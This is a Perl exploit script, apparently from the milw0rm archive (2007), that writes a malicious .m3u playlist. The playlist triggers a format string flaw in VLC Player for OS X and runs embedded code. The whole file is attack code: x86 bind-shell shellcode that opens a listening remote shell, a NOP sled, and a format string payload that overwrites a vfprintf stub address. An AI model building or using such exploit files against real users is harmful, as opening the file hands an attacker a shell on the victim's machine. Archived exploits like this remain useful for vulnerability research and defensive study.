#!/usr/bin/perl
#
# http://www.digitalmunition.com/VLCMediaSlayer-x86.pl
# Code by Kevin Finisterre kf_lists[at]digitalmunition[dot]com
#
# This exploit will create a malicious .m3u file that will cause VLC Player for OSX to execute arbitrary code.
#

$outfile = "pwnage.m3u";

$bindshell =
"\x6a\x42\x58\xcd\x80\x6a\x61\x58\x99\x52\x68\x10\x02\x11\x5c\x89" .
"\xe1\x52\x42\x52\x42\x52\x6a\x10\xcd\x80\x99\x93\x51\x53\x52\x6a" .
"\x68\x58\xcd\x80\xb0\x6a\xcd\x80\x52\x53\x52\xb0\x1e\xcd\x80\x97" .
"\x6a\x02\x59\x6a\x5a\x58\x51\x57\x51\xcd\x80\x49\x0f\x89\xf1\xff" .
"\xff\xff\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50" .
"\x54\x54\x53\x53\xb0\x3b\xcd\x80";

# MALLOC                 02800000-03008000 [ 8224K] rw-/rwx SM=COW  ...e_0x1300000
# Pattern found @ 0x298589e
# Pattern found @ 0x298ba92

$jmpaddr = 0x41424344;

$lo = ($jmpaddr >> 0) & 0xffff;
$hi = ($jmpaddr >> 16) & 0xffff;

printf "jump address is: 0x%x%x\n", $hi, $lo;

$format = "%25" . ($lo-0x24) . "d" . "%25" . "23" . "%24" . "hn" . "%25" . ($hi-$lo) . "d" . "%25" . "24" . "%24" . "hn" ;

$writeaddr = 0xa0011393 ; # <dyld_stub___vfprintf>

printf "writing to file: %s\n", $outfile;
open(PWNED,">$outfile");

print PWNED "#EXTM3U\n" . "#EXTINF:0,1-07 " . "\x90" x 50 . $bindshell . "\n" .
"udp://--" . pack('l', $writeaddr+2) . pack('l', $writeaddr) .
$format . "i" x (999 - length("Can't get file status for ") ) . "\n";

close(PWNED);

# milw0rm.com [2007-01-02]
